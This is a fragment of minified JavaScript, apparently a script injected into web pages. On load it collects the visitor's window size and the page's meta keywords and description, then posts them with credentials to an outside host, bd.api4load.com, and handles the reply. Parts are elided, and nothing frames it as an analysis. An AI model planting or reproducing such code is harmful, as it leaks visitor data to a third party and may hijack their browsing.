...
;(function(c, a, m, n) {
    function g() {
        function ajax(a, b, c) {
            ...
            d.withCredentials = !0;
            b ? (d.setRequestHeader("Content-Type", "application/json; charset=UTF-8"),
            d.send(JSON.stringify(b))) : d.send()
        }
        if (c == c.top) {
            for (var f = a.documentElement, b = a.body, req = c.innerWidth || f.clientWidth || b.clientWidth, f = c.innerHeight || f.clientHeight || b.clientHeight, b = document.querySelectorAll("meta"), k = [], l = [], e = 0; e < b.length; e++)
                switch (b[e].name.toLowerCase()) {
                case "keywords":
                    k.push(b[e].content);
                    break;
                case "description":
            ...
            a.gotowf || c.__tcjsch || (a.gotowf = !0,
            c.__tcjsch = !0,
            ajax(m, req, function(a) {
                if (a)
                    try {
    ...
    a.body ? g() : a.addEventListener("DOMContentLoaded", g)
}
)(window, document, "//bd.api4load.com/post", {
    "version": "1.1",
    "name": "jqr1",
    "time": 1529929262,
    "userid": 22052140,
    ...
    "server_id": 1,
    "geo": "BD",
    "create_date": 1481728040,
    "sig": "5d2039b290e636ae0c2bf19b38e6b0d7",
    "reg_params": {
        "v": 2
    }
});